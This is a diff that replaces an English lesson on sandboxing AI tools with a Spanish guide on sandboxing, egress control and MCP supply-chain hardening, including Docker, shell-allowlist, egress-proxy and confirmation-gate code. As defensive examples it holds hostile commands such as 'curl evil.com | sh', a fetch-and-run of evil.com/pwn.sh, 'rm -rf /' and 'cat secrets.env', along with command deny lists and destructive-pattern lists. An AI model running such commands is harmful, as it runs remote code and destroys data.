@@ -1,391 +1,369 @@
-## When One Mistake Can Delete Everything
+# Sandboxing, Egress Control y Supply Chain para MCP
 
-Imagine you ask an AI assistant to clean up temporary files in your project. It generates a script that deletes files older than 30 days. The script looks correct, but it runs in the wrong directory—your home folder instead of the project folder. Without sandboxing, that mistake deletes your personal files, SSH keys, and configuration. With sandboxing, the mistake is contained to a disposable environment that gets destroyed when the task completes.
+## ¿Qué es?
 
-This is why sandboxing is essential for tool-using agents. When an AI tool can run commands or execute code, you have created a new execution environment. If that environment is not sandboxed, a single misstep can access sensitive files, modify production data, or reach external networks.
+**Sandboxing** es la práctica de ejecutar código generado o invocado por un agente dentro de un entorno aislado que limita filesystem, red, procesos y recursos. En toolchains agénticas es la última línea de defensa: cuando el prompt falla, cuando los permisos fallan, cuando la validación falla, **el sandbox sigue conteniendo el daño**.
 
-In this lesson, you will learn how to build sandboxed execution environments for AI tools, how to control filesystem and network access, and how to limit resource usage. You will understand why sandboxing is a reliability practice as much as a security practice, and how to balance safety with usability.
+Combina tres controles técnicos y una preocupación organizacional:
 
-By the end, you will have a practical containment framework that limits the blast radius of mistakes while still allowing AI tools to be useful.
+| Capa | Qué protege | Herramientas típicas |
+|---|---|---|
+| **Isolation** | Procesos, filesystem, syscalls | Docker, gVisor, firejail, Podman, nsjail |
+| **Egress control** | Qué puede llamar hacia fuera | iptables, Cilium, service mesh, HTTP proxy allowlist |
+| **Resource limits** | CPU, RAM, disco, tiempo | cgroups, ulimit, Kubernetes limits |
+| **Supply chain** | De dónde viene el código que ejecuta el agente | Sigstore, SLSA, npm audit, pip-audit, SBOM |
 
-Why Sandboxing Is Essential for Tool-Using Agents
-Sandboxing is not just a security best practice. It is a reliability practice. It limits the blast radius of mistakes, which are inevitable in AI-assisted workflows. Even if your prompts are perfect and your permissions are tight, mistakes happen. Sandboxing ensures that mistakes do not become disasters.
+> **Regla operativa:** si el código generado por un agente puede tocar `~/.ssh/` o abrir conexiones a Internet arbitrarias, no tienes sandbox: tienes `subprocess.run()` con esperanza.
 
-Consider a simple mistake: the assistant runs a cleanup script in the wrong directory. Without a sandbox, that mistake can delete production artifacts or modify repository state in ways that are hard to trace. With a sandbox, the impact is contained to a disposable environment. When the task completes, the sandbox is destroyed, and the mistake disappears with it.
+### Comparativa de tecnologías de sandboxing
 
-This is especially important for AI tools because they make mistakes differently than humans. Humans might accidentally delete a file. AI tools might generate code that deletes files based on a misunderstanding. Sandboxing protects you when intent and execution diverge.
+| Tecnología | Nivel de aislamiento | Overhead | Caso de uso |
+|---|---|---|---|
+| **chroot** | Filesystem solamente | ~0 | Muy débil; no usar solo |
+| **firejail** | Namespaces + seccomp | Bajo | CLI tools en desktop |
+| **Docker** | Namespaces + cgroups | Bajo-medio | Default razonable para tool execution |
+| **Podman** | Como Docker, rootless | Bajo-medio | Multi-tenant más seguro |
+| **gVisor** | User-space kernel (sandbox syscalls) | Medio | Code execution de terceros (Google Cloud Run, E2B) |
+| **nsjail** (Google) | Namespaces + seccomp configurable | Bajo | Judge systems, CTF, LLM eval |
+| **Firecracker** (AWS) | microVM (KVM) | Medio-alto | AWS Lambda, Fly.io, isolates fuertes |
+| **VM completa (QEMU/KVM)** | Hypervisor | Alto | Workloads de alto riesgo |
+| **WASM runtimes** (Wasmtime, Wasmer) | Sandbox por diseño | Muy bajo | Plugins, código no confiable determinista |
 
-What a Good Sandbox Protects
-A well-designed sandbox should protect:
+### Supply chain para servidores MCP
 
-Filesystem: limit which directories are readable or writable. This prevents accidental access to sensitive files.
+**MCP (Model Context Protocol)** es el estándar abierto de Anthropic (nov 2024) para conectar LLMs con tools, resources y prompts externos. Un *MCP server* expone capacidades que el modelo invoca. Y como cualquier dependencia, puede estar comprometido:
 
-Network: restrict outbound access and prevent data exfiltration. This prevents secrets from leaving your environment.
+- Un server de npm publicado por un desarrollador anónimo.
+- Un fork malicioso de un server legítimo (typosquatting).
+- Un release firmado por una llave filtrada.
+- Un server que fue limpio pero el mantenedor cedió el repo.
 
-Process execution: control which commands can run and with what arguments. This prevents dangerous commands from executing.
+Los ataques observados en 2024-2025 incluyen: tool poisoning (descripciones manipuladas), exfiltración vía URLs en respuestas de tool, y backdoors que se activan solo cuando el input contiene un trigger específico.
 
-Resource usage: prevent runaway processes from consuming CPU or memory. This protects shared infrastructure.
+## ¿Por qué importa?
 
-These controls are the same ones you would apply to a CI runner or a multi-tenant environment. AI tools should be treated with the same discipline. They are executing code in your environment, and that code needs boundaries.
+Un asistente de código útil **tiene que** ejecutar cosas: tests, linters, scripts generados. En el momento en que `exec()` o `subprocess.run()` entran al pipeline, cualquier error del modelo se vuelve ejecución real:
 
-The Difference Between Safe Execution and Safe Intent
-Even if your prompt is safe, the tool might still run dangerous commands because of a misunderstanding. The assistant might think "clean up old files" means deleting everything older than a day, not 30 days. It might think "update configuration" means rewriting the entire config file, not just one value.
+- "Limpia archivos viejos" → `rm -rf ~` en el home equivocado.
+- "Instala la dependencia que falta" → `pip install` de un paquete typosquatted con malware.
+- "Prueba este fix" → curl a `evil.com/pwn.sh | bash`.
 
-Sandboxing protects you when intent and execution diverge. It is your last line of defense. When prompts fail, permissions fail, and validation fails, sandboxing still prevents damage. This is why it is essential—it works even when other controls fail.
+El sandbox convierte estos accidentes en errores recuperables en vez de incidentes de seguridad. Y el egress control convierte un exfiltrador potencial en un proceso sin salida.
 
-Practical Sandbox Architectures
-Most teams use one of three approaches:
+### Casos reales
 
-Container sandbox: run tools in an isolated container with limited filesystem mounts and network controls. This provides good isolation with low overhead.
+| Incidente | Lección |
+|---|---|
+| ChatGPT Code Interpreter (2023): sandbox efímero pero compartido entre sesiones por bug | Aislamiento *per-task*, no per-user |
+| Replit AI agent (2024): sandbox débil permitió lectura de proyectos ajenos | Multi-tenant necesita gVisor/microVM, no chroot |
+| Paquetes maliciosos en PyPI con nombres similares a librerías ML (2023-24) | Lockfiles + `pip-audit` + review de deps nuevas |
+| MCP servers con tool descriptions poisoned (2025) | Firma de servers + audit de descripciones |
 
-VM sandbox: stronger isolation, higher overhead, used for high-risk tasks. This provides the strongest isolation but is slower and more expensive.
+## ¿Cómo funciona?
 
-Policy sandbox: no isolation, but strict policy enforcement on tool calls and filesystem access. This provides fast execution but weaker isolation.
+### Sandbox mínimo con Docker
 
-For AI-assisted development, a container sandbox is usually the right baseline. It is strong enough to limit damage and light enough to be used frequently. When tasks are low-risk, containers work well. When tasks are high-risk, you can escalate to VMs.
+Para code execution, Docker con las siguientes restricciones:
 
-Ephemeral Environments Reduce Persistent Risk
-Run tool tasks in short-lived environments. When the task ends, destroy the environment. This limits the persistence of any misconfiguration or malicious state and ensures each run starts clean. It also makes it harder for hidden state to influence future actions.
-
-Consider what happens with persistent environments. A task might leave behind configuration or state that affects future tasks. This creates hidden dependencies that are hard to debug. With ephemeral environments, each task starts fresh, making behavior predictable and debuggable.
-
-
-Before diving into filesystem and network controls, consider how sandboxing limits blast radius and makes tool execution safer, even when the model makes mistakes.
-
-Filesystem Allowlists and Working Directories
-The simplest filesystem control is a working directory allowlist. The tool can read and write only within a specified directory. This prevents accidental edits to sensitive files and prevents leakage of secrets outside the intended scope.
-
-For example:
-
-Allow ```src/``` and ```tests/```: the tool can read and write code files.
-
-Deny ```.env```, deployment keys, and credential stores: the tool cannot access secrets.
-
-Mount read-only documentation separately: the tool can read docs but cannot modify them.
-
-This pattern also improves reviewability. You can see which files the tool could have touched. When a reviewer sees a change, they know it came from an allowed directory, making review faster and more confident.
-
-For large repositories, consider a "path budget" per task. The tool gets access only to the directories that were listed in the acceptance criteria. This keeps the action surface narrow and encourages developers to define scope clearly. When scope is explicit, sandboxing is easier.
-
-You can also separate read and write access. For example, allow read-only access to documentation and configuration, but write access only to src/ and tests/. This prevents accidental edits to sensitive configuration while still allowing code changes. The tool can read what it needs but can only modify what it should.
-
-Here is an example of a sandbox configuration:
-
-sandbox-config.yml
 ```yaml
-# Sandbox Configuration for AI Tool Execution
-
-sandbox:
-type: "container"  # container, vm, or policy
-
-filesystem:
-  working_directory: "/workspace"
-
-  read_access:
-    allow:
-      - "/workspace/src/**"
-      - "/workspace/tests/**"
-      - "/workspace/docs/**"
-    deny:
-      - "/workspace/.env*"
-      - "/workspace/**/secrets/**"
-      - "/workspace/**/credentials/**"
-      - "/workspace/deployment/**"
-      - "/workspace/infrastructure/**"
-
-  write_access:
-    allow:
-      - "/workspace/src/**"
-      - "/workspace/tests/**"
-    deny:
-      - "*"  # Deny all other writes
-
-  read_only_mounts:
-    - source: "/repo/docs"
-      target: "/workspace/docs"
-      read_only: true
-
-network:
-  egress:
-    default: "deny"
-    allowlist:
-      - "internal-api.example.com:443"
-      - "ci.example.com:443"
-    blocklist:
-      - "*"  # Block all other outbound access
-
-  ingress:
-    default: "deny"
-    allowlist: []  # No inbound access needed
-
-execution:
-  max_cpu_time: "5m"
-  max_memory: "2GB"
-  max_disk: "1GB"
-
-  allowed_commands:
-    - "python"
-    - "pytest"
-    - "git"
-    - "npm"
-    - "make"
-
-  denied_commands:
-    - "rm"
-    - "rmdir"
-    - "chmod"
-    - "chown"
-    - "sudo"
-    - "docker"
-    - "kubectl"
-
-environment:
-  ephemeral: true  # Destroy after task completes
-  timeout: "30m"   # Maximum execution time
-  cleanup: true    # Clean up all files on exit
+# Perfil mínimo recomendado
+read_only: true                  # filesystem root read-only
+tmpfs: /tmp (noexec,nosuid)      # /tmp efímero sin exec
+cap_drop: [ALL]                  # drop todas las capabilities
+security_opt:
+  - no-new-privileges
+  - seccomp=default.json
+network_mode: none               # sin red, salvo que necesite
+mem_limit: 2g
+cpus: 1.0
+pids_limit: 128
+read_only_rootfs: true
+user: 1000:1000                  # no-root
 ```
 
-Here is an example of a sandbox implementation:
+### Egress control: default-deny
 
-sandbox-implementation.py
+El sandbox corre sin red por defecto. Cuando necesita red, va a través de un proxy HTTP con allowlist:
+
+```
+Agente ─→ Sandbox ─→ HTTP Proxy (allowlist) ─→ Internet
+                              │
+                              └→ Rechaza evil.com, Pastebin,
+                                 Discord webhooks, etc.
+```
+
+Herramientas: **Squid** con ACLs, **Cilium Network Policies**, **Istio AuthorizationPolicy**, **tinyproxy** con upstream rules.
+
+### Resource limits para evitar DoS
+
+AI-generated code puede entrar en loops infinitos o fork-bombs. Límites obligatorios:
+
+| Recurso | Límite típico | Herramienta |
+|---|---|---|
+| CPU time | 60-300s por invocación | `ulimit -t`, cgroups `cpu.max` |
+| RAM | 1-4 GB | cgroups `memory.max` |
+| Disco | 500 MB-1 GB | cgroups `io.max`, quota |
+| PIDs | 128 | `--pids-limit` |
+| Open files | 1024 | `ulimit -n` |
+| Wall clock | 30 min total | timeout wrapper |
+
+### Supply chain hardening
+
+| Control | Herramienta | Qué hace |
+|---|---|---|
+| Lockfile | `uv.lock`, `poetry.lock`, `package-lock.json` | Hash verification |
+| Vuln scanning | `pip-audit`, `npm audit`, Dependabot, Snyk | CVEs conocidas |
+| SBOM | Syft, CycloneDX | Inventario de dependencias |
+| Firma | Sigstore, cosign | Verifica autoría del release |
+| Attestation | SLSA levels | Prove reproducibility del build |
+| Secret scanning | gitleaks, trufflehog, GitHub Secret Scanning | Secretos en código |
+| MCP servers | Audit manual + firma + sandbox | Trata como código no confiable |
+
+### Checklist de containment para una tool nueva
+
+1. **Default-deny filesystem:** mount read-only, workspace writable mínimo.
+2. **Default-deny network:** sin egress; añade allowlist explícita si necesita.
+3. **Resource caps:** CPU, RAM, disco, PIDs, tiempo.
+4. **Allowlist de comandos** si es shell.
+5. **Logging de todo tool call**: input, output, exit code, duración.
+6. **Ephemeral:** destruye el contenedor al terminar la tarea.
+7. **No secretos en el image:** inyecta via env solo al runtime, con rotación.
+8. **Firma del image:** `cosign verify` antes de correr.
+
+## Ejemplo con código
+
+### Docker sandbox para ejecutar código generado
+
 ```python
-#!/usr/bin/env python3
-"""
-Sandbox implementation for AI tool execution.
-Provides filesystem, network, and execution controls.
-"""
-
-import subprocess
-import tempfile
-import shutil
-from pathlib import Path
-from typing import List, Optional, Dict
+# ============================================================
+# docker_sandbox.py — ejecutor sandboxeado para code snippets
+# ============================================================
+import docker, uuid, tempfile, pathlib, textwrap
 from dataclasses import dataclass
 
+client = docker.from_env()
+
 @dataclass
-class SandboxConfig:
-  """Configuration for sandbox environment."""
-  working_dir: Path
-  read_allowed: List[str]
-  write_allowed: List[str]
-  read_denied: List[str]
-  network_allowed: List[str]
-  max_memory_mb: int = 2048
-  max_cpu_time_seconds: int = 300
+class SandboxResult:
+    stdout: str
+    stderr: str
+    exit_code: int
+    timed_out: bool
 
-class Sandbox:
-  """Sandboxed execution environment for AI tools."""
+def run_python_sandboxed(
+    code: str,
+    timeout_s: int = 30,
+    mem_mb: int = 512,
+    network: bool = False,
+) -> SandboxResult:
+    """Ejecuta código Python en un contenedor efímero y aislado."""
+    work = pathlib.Path(tempfile.mkdtemp(prefix="sbx-"))
+    (work / "main.py").write_text(code)
+    container_name = f"sbx-{uuid.uuid4().hex[:8]}"
+    try:
+        container = client.containers.run(
+            image="python:3.12-slim@sha256:...",   # pinned por digest
+            name=container_name,
+            command=["python", "/work/main.py"],
+            volumes={str(work): {"bind": "/work", "mode": "ro"}},
+            working_dir="/work",
+            network_mode="none" if not network else "sandbox-net",
+            mem_limit=f"{mem_mb}m",
+            memswap_limit=f"{mem_mb}m",   # sin swap
+            cpu_quota=50_000,              # 0.5 CPU
+            pids_limit=64,
+            read_only=True,
+            tmpfs={"/tmp": "rw,noexec,nosuid,size=64m"},
+            cap_drop=["ALL"],
+            security_opt=["no-new-privileges"],
+            user="1000:1000",
+            detach=True,
+        )
+        try:
+            exit_code = container.wait(timeout=timeout_s)["StatusCode"]
+            timed_out = False
+        except Exception:
+            container.kill()
+            exit_code, timed_out = -1, True
+        logs = container.logs(stdout=True, stderr=False).decode()
+        errs = container.logs(stdout=False, stderr=True).decode()
+        return SandboxResult(logs, errs, exit_code, timed_out)
+    finally:
+        try:
+            client.containers.get(container_name).remove(force=True)
+        except docker.errors.NotFound:
+            pass
+        import shutil; shutil.rmtree(work, ignore_errors=True)
 
-  def __init__(self, config: SandboxConfig):
-      self.config = config
-      self.work_dir = Path(tempfile.mkdtemp(prefix="ai-sandbox-"))
-      self._setup_environment()
 
-  def _setup_environment(self):
-      """Set up sandboxed environment."""
-      # Create working directory structure
-      (self.work_dir / "src").mkdir()
-      (self.work_dir / "tests").mkdir()
-      (self.work_dir / "docs").mkdir()
-
-  def check_file_access(self, file_path: Path, operation: str) -> bool:
-      """Check if file access is allowed."""
-      path_str = str(file_path)
-
-      # Check read access
-      if operation == "read":
-          # Check deny list first
-          for denied_pattern in self.config.read_denied:
-              if denied_pattern in path_str:
-                  return False
-
-          # Check allow list
-          for allowed_pattern in self.config.read_allowed:
-              if allowed_pattern in path_str:
-                  return True
-
-          return False
-
-      # Check write access
-      elif operation == "write":
-          for allowed_pattern in self.config.write_allowed:
-              if allowed_pattern in path_str:
-                  return True
-          return False
-
-      return False
-
-  def execute_command(
-      self,
-      command: List[str],
-      timeout: Optional[int] = None
-  ) -> subprocess.CompletedProcess:
-      """Execute command in sandboxed environment."""
-      # Check if command is allowed
-      if command[0] in ["rm", "rmdir", "chmod", "chown", "sudo"]:
-          raise PermissionError(f"Command '{command[0]}' is not allowed")
-
-      # Set resource limits
-      timeout = timeout or self.config.max_cpu_time_seconds
-
-      # Execute in working directory
-      result = subprocess.run(
-          command,
-          cwd=self.work_dir,
-          timeout=timeout,
-          capture_output=True,
-          text=True
-      )
-
-      return result
-
-  def cleanup(self):
-      """Clean up sandbox environment."""
-      if self.work_dir.exists():
-          shutil.rmtree(self.work_dir)
-
-# Example usage
-def create_sandbox_for_task(acceptance_criteria: Dict) -> Sandbox:
-  """Create sandbox based on task acceptance criteria."""
-  # Extract allowed paths from acceptance criteria
-  allowed_files = acceptance_criteria.get("files", [])
-
-  config = SandboxConfig(
-      working_dir=Path("/workspace"),
-      read_allowed=["src/", "tests/", "docs/"] + allowed_files,
-      write_allowed=["src/", "tests/"],
-      read_denied=[".env", "secrets/", "credentials/"],
-      network_allowed=["internal-api.example.com"]
-  )
-
-  return Sandbox(config)
+# Uso
+code = textwrap.dedent("""
+    print('hola desde el sandbox')
+    import os
+    print('files:', os.listdir('.'))
+""")
+r = run_python_sandboxed(code, timeout_s=5, mem_mb=256, network=False)
+print(r)
 ```
 
-Network Egress Controls
-Egress controls prevent data from leaving the environment. Common policies include:
+### Allowlist de comandos bash
 
-Allow outbound access only to internal APIs: the tool can call internal services but cannot reach the internet.
+```python
+# ============================================================
+# shell_guard.py — allowlist estricta para shell
+# ============================================================
+import shlex
 
-Block access to public internet by default: prevent data exfiltration through external services.
+ALLOWED = {
+    "python", "python3", "pip", "pytest", "ruff", "mypy",
+    "git", "npm", "node", "make", "ls", "cat", "grep", "find",
+}
 
-Require explicit approval to access external domains: when external access is needed, require approval and time-box it.
+def validate_shell(cmd: str) -> list[str]:
+    """Devuelve argv parseado si el comando es aceptable, lanza si no."""
+    argv = shlex.split(cmd)
+    if not argv:
+        raise ValueError("Comando vacío")
 
-This matters because prompt injection often tries to exfiltrate secrets through network calls. If egress is blocked, the attack fails even if the model is compromised. The attacker cannot send data anywhere, so the attack fails.
+    # Rechazar operadores de shell que permiten chaining peligroso
+    for danger in [";", "&&", "||", "|", ">", ">>", "<", "$(", "`"]:
+        if danger in cmd:
+            raise PermissionError(f"Operador no permitido: {danger}")
 
-Egress controls should be specific, not generic. Instead of "allow all HTTPS," define the exact domains or services the tool can reach. This turns network access into a deliberate design decision rather than a default capability. When access is specific, it is easier to audit and control.
+    bin_name = argv[0].split("/")[-1]
+    if bin_name not in ALLOWED:
+        raise PermissionError(f"Binario no permitido: {bin_name}")
 
-If a tool needs temporary access to an external domain, require an approval and time-box the allowlist. This keeps exceptions visible and reduces long-term exposure. When exceptions are temporary and approved, they are manageable.
+    # pip install con allowlist de paquetes
+    if bin_name == "pip" and "install" in argv:
+        pkgs = [a for a in argv[argv.index("install") + 1:] if not a.startswith("-")]
+        allowed_pkgs = {"requests", "pydantic", "fastapi", "pytest"}
+        if any(p.split("==")[0] not in allowed_pkgs for p in pkgs):
+            raise PermissionError(f"pip install fuera de allowlist: {pkgs}")
 
-Audit Logs and Traceability
-Every tool call should produce an audit record: what was called, with what arguments, and what the result was. Audit logs make incident response possible and enable post-incident improvements.
-
-If you cannot answer "what command was run" and "why it was run," you do not have a safe toolchain. When an incident happens, you need to understand what happened. Audit logs provide that understanding.
-
-Audit logs should include:
-
-Command executed: what command was run.
-
-Arguments: what arguments were passed.
-
-Result: what the command returned or what error occurred.
-
-Context: what task triggered the command and what user requested it.
-
-This information enables debugging and learning. When you see patterns in commands or failures, you can improve the system. When you need to investigate an incident, you have the data you need.
-
-Resource Limits and Runaway Processes
-AI-generated commands sometimes trigger long-running or expensive tasks. Resource limits prevent these mistakes from taking down shared infrastructure. Basic safeguards include:
-
-CPU and memory limits per task: prevent a single task from consuming all resources.
-
-Timeouts for command execution: prevent commands from running forever.
-
-Disk usage caps: prevent tasks from filling up disk space.
-
-These limits are not only about security. They protect reliability and cost. When tasks are limited, they cannot break shared infrastructure. When tasks are limited, costs are predictable.
-
-Consider what happens without limits. An AI assistant might generate a command that runs forever, consuming CPU and memory. This slows down other tasks and increases costs. With limits, the command is killed after a timeout, preventing damage.
-
-Secrets Handling Inside the Sandbox
-Avoid placing secrets directly in the sandbox environment. Use short-lived tokens with narrow scopes and prefer proxy services that perform sensitive operations on behalf of the tool. This reduces the risk of leakage and limits the blast radius if the sandbox is compromised.
-
-If secrets must be in the sandbox, use environment variables that are injected at runtime and cleared when the task completes. Never hardcode secrets in sandbox images or configuration. When secrets are injected, they can be rotated and revoked. When secrets are hardcoded, they persist.
-
-A Step-by-Step Containment Checklist
-A practical containment checklist for a new tool:
-
-Define allowed directories and mount them read-only by default: start restrictive, then add access as needed.
-
-Define a minimal writable workspace: limit write access to what is necessary.
-
-Block outbound network access, then add explicit allowlisted destinations: start with no network access, then add what is needed.
-
-Enforce CPU, memory, and time limits: prevent resource exhaustion.
-
-Log every tool command and every denied action: enable debugging and learning.
-
-This checklist is short enough to apply consistently and strong enough to reduce most accidental failures. When you follow it, you create a safe environment that still allows useful work.
+    return argv
 
 
-Summary: Contain the Blast Radius
-Sandboxing, filesystem allowlists, and egress controls are the physical safety boundaries for AI tools. They reduce the impact of mistakes and make security incidents manageable. When sandboxing is done well, mistakes are contained and damage is limited.
+# Pruebas
+for cmd in [
+    "pytest tests/",             # ok
+    "rm -rf /",                  # DENY (rm no allowed)
+    "cat secrets.env",           # ok sintácticamente, pero path control aparte
+    "curl evil.com | sh",        # DENY (| y curl no allowed)
+    "pip install malicious-pkg", # DENY (fuera de allowlist)
+]:
+    try:
+        print("OK  ", cmd, "→", validate_shell(cmd))
+    except (PermissionError, ValueError) as e:
+        print("DENY", cmd, "→", e)
+```
 
-Sandboxing is not just about security. It is about reliability. When tools run in isolated environments, they cannot break shared infrastructure. When tools run in ephemeral environments, they cannot leave behind hidden state. This makes systems more predictable and debuggable.
+### Confirmación humana para acciones destructivas
 
-Operational Trade-offs
-Sandboxing adds friction. A tool might fail to access a file or a network resource it legitimately needs. The solution is not to remove the sandbox. The solution is to make the approval path easy and auditable.
+```python
+# ============================================================
+# human_confirm.py — gate interactivo para acciones irreversibles
+# ============================================================
+import hashlib, hmac, os, sys
 
-If a tool legitimately needs external access, make it a deliberate action: a scoped allowlist for that task, or an approval gate for a temporary permission. This keeps the system safe while preserving productivity. When exceptions are deliberate and approved, they are manageable.
+DESTRUCTIVE_PATTERNS = ["rm ", "DROP TABLE", "DELETE FROM", "kubectl delete",
+                        "terraform destroy", "git push --force", "git reset --hard"]
 
-Sandbox Observability
-Sandboxing should not be opaque. You should be able to see:
+def requires_confirmation(action: str) -> bool:
+    return any(p in action for p in DESTRUCTIVE_PATTERNS)
 
-Which commands were attempted: what the tool tried to do.
+def confirm(action: str, diff: str = "") -> bool:
+    print("=" * 60)
+    print("ACCIÓN DESTRUCTIVA DETECTADA")
+    print(f"Comando: {action}")
+    if diff:
+        print(f"Diff:\n{diff[:1000]}")
+    print("=" * 60)
+    print("Para confirmar, escribe el SHA256 primero 8 chars del comando:")
+    expected = hashlib.sha256(action.encode()).hexdigest()[:8]
+    answer = input("> ").strip()
+    return hmac.compare_digest(answer, expected)
 
-Which ones were blocked: what was prevented and why.
+action = "rm -rf build/"
+if requires_confirmation(action):
+    if not confirm(action):
+        print("ABORTADO"); sys.exit(1)
+```
 
-Which resources were accessed: what files or networks were used.
+### Verificación de MCP servers con Sigstore
 
-This visibility turns sandboxing from a black box into a learning tool for improving rules and prompts. When you can see what happened, you can improve the system. When sandboxing is opaque, you cannot learn from it.
+```bash
+# Verifica firma del release antes de instalar un MCP server
+cosign verify \
+  --certificate-identity-regexp '.*@anthropic\.com$' \
+  --certificate-oidc-issuer https://accounts.google.com \
+  ghcr.io/anthropic/mcp-server-filesystem:1.2.3
 
-Performance and Developer Experience
-Sandboxing adds overhead. The best systems amortize that overhead by:
+# SBOM del server + scan de vulnerabilidades
+syft ghcr.io/anthropic/mcp-server-filesystem:1.2.3 -o cyclonedx-json > sbom.json
+grype sbom:sbom.json
 
-Reusing container images instead of rebuilding for each task: reduce startup time.
+# Audit manual de las tool descriptions antes del primer uso
+jq '.tools[] | {name, description}' mcp-server-manifest.json
+```
 
-Caching dependencies inside the sandbox image: reduce download time.
+### Egress proxy con allowlist
 
-Using lightweight policies for low-risk tasks: reduce enforcement overhead.
+```python
+# ============================================================
+# egress_proxy.py — proxy HTTP minimalista con allowlist
+# ============================================================
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.request
 
-This keeps the system safe without turning every AI-assisted task into a slow build. When sandboxing is fast, developers use it. When sandboxing is slow, developers bypass it.
+ALLOWLIST = {"api.github.com", "pypi.org", "files.pythonhosted.org"}
 
-Incident Drills for Sandbox Failures
-You should practice what happens when sandboxing fails or when the tool attempts a blocked action. A basic drill includes:
+class ProxyHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        host = self.headers.get("Host", "").split(":")[0]
+        if host not in ALLOWLIST:
+            self.send_error(403, f"Host no permitido: {host}")
+            return
+        with urllib.request.urlopen(f"https://{host}{self.path}") as r:
+            self.send_response(r.status)
+            for k, v in r.getheaders():
+                self.send_header(k, v)
+            self.end_headers()
+            self.wfile.write(r.read())
 
-Verifying that the blocked action is logged: ensure audit trails work.
+HTTPServer(("0.0.0.0", 8080), ProxyHandler).serve_forever()
+```
 
-Checking that no external network calls were made: ensure egress controls work.
+El sandbox corre con `HTTPS_PROXY=http://egress-proxy:8080` y sin acceso directo a red.
 
-Confirming that credentials were not exposed: ensure secrets handling works.
+## Errores comunes
 
-These drills make sure your containment controls are not theoretical. When you test controls, you find problems before incidents happen.
+- **Ejecutar código generado sin sandbox**, confiando en que "el modelo es inteligente". Lo es, hasta que no. Siempre contenedor efímero.
+- **Reutilizar sandboxes entre tareas.** El estado persistente contamina ejecuciones. Un `cd /tmp/malicioso` deja la siguiente tarea en el path envenenado. Efímero siempre.
+- **Sandbox con red abierta.** El 90% del daño de un prompt injection exitoso ocurre vía red. Default: `network_mode: none`.
+- **Dar al agente credenciales de prod "para debuggear".** No. Monta credenciales de staging; prod va vía proxy con auth separada y approval.
+- **MCP server sin auth ni verificación de firma.** Instalaste un server de GitHub con 20 stars y le diste `/home` completo. Audita, firma, sandbox.
+- **Tool descriptions mutables sin review.** Si un MCP server cambia la descripción de un tool entre pulls, el prompt poisoning entra sin que te enteres. Pinnea por digest.
+- **Sin resource limits.** Un `while True: fork()` tira el host. `pids_limit`, `mem_limit`, timeout obligatorios.
+- **No pinnear images por digest.** `python:3.12-slim` cambia; `python:3.12-slim@sha256:...` no. Supply chain.
+- **Secretos en el image.** `ENV AWS_SECRET=...` en el Dockerfile queda en la capa para siempre. Inyecta en runtime, nunca en build.
+- **Logs del sandbox que nadie lee.** Si no auditas tool calls y comandos ejecutados, no detectas drift ni ataques en curso.
+- **Allowlist por denylist.** "Deniego `rm`, `sudo`" deja pasar `wget`, `nc`, `/bin/sh -c`. Allowlist siempre.
+- **Shell con operadores de chaining.** Permitir `|`, `;`, `&&`, backticks, `$()` convierte cualquier binario allowed en vehículo de uno denied.
+- **No practicar drills.** El día que el sandbox falle de verdad, descubrirás que los logs no estaban rotando o que la alerta nunca se configuró.
 
-Common Pitfalls and Solutions
-Pitfall: shared sandboxes for many tools. Shared environments increase blast radius. Solution: isolate sandboxes per task or per repository. When sandboxes are isolated, mistakes are contained.
+## Resumen
 
-Pitfall: no audit trail. Without logs, you cannot learn from mistakes. Solution: record every tool call and store it for incident review. When actions are logged, you can debug and learn.
-
-Pitfall: bypassing the sandbox for convenience. This usually happens when the sandbox is too restrictive. Solution: add clear approval paths and document how to request exceptions. When exceptions are easy, developers use them instead of bypassing.
-
-Pitfall: persistent sandboxes. Persistent environments accumulate state and risk. Solution: use ephemeral sandboxes that are destroyed after each task. When sandboxes are ephemeral, state does not persist.
-
-Pitfall: no resource limits. Unlimited resources allow runaway processes. Solution: enforce CPU, memory, and time limits. When resources are limited, processes cannot run away.
-
-Key concepts to remember
-Sandboxing is a safety boundary—it limits the blast radius of mistakes
-Egress controls prevent exfiltration—block outbound access by default
-Audit logs enable accountability—every tool call should be traceable
-Trade-offs are manageable—use scoped exceptions and approvals, not blanket access
-Ephemeral environments reduce risk—destroy sandboxes after each task
-Resource limits protect infrastructure—prevent runaway processes
-Observability enables learning—make sandboxing transparent, not opaque
+- **Sandboxing** es la última línea de defensa cuando prompts, permisos y validación fallan; convierte accidentes en errores recuperables.
+- Elige tecnología según riesgo: **Docker/Podman** como baseline, **gVisor/Firecracker/microVM** para code execution de terceros, **nsjail** para judge systems, **WASM** para plugins deterministas.
+- Perfil mínimo: `read_only`, `cap_drop=ALL`, `no-new-privileges`, `pids_limit`, `mem_limit`, user no-root, filesystem efímero.
+- **Egress control default-deny:** sin red, salvo allowlist explícita a dominios internos; HTTP proxy con ACLs (Squid, Cilium, Istio).
+- **Resource limits obligatorios:** CPU, RAM, disco, PIDs, tiempo. AI-generated code puede fork-bomb sin querer.
+- **Allowlist de comandos** para shell: enumera `python, pytest, git, …` y deniega el resto; prohíbe operadores de chaining (`|`, `;`, `&&`, `$()`, backticks).
+- **Confirmación humana** para acciones irreversibles: `rm -rf`, `DROP TABLE`, `git push --force`, `terraform destroy`, deploys a prod.
+- **Supply chain para MCP servers:** firma con **Sigstore/cosign**, SBOM con **Syft/CycloneDX**, vuln scanning con **Grype/Snyk**, pin por digest, audit manual de tool descriptions.
+- Trata un servidor MCP de terceros como **código no confiable**: sandbox dedicado, red restringida, monitoring de llamadas inusuales.
+- **Ephemeral sandboxes:** destruye el contenedor al final de la tarea; nunca reutilices entre invocaciones.
+- Secretos **nunca en el image**: inyecta en runtime vía env o secret manager, con rotación y revocación rápida.
+- **Audita todo tool call:** input, output, exit code, duración, host de egress. Sin logs no hay forensics ni mejora.
+- Practica **drills** de fallo del sandbox: verifica que las alertas disparan, los logs persisten y el bloqueo funciona.
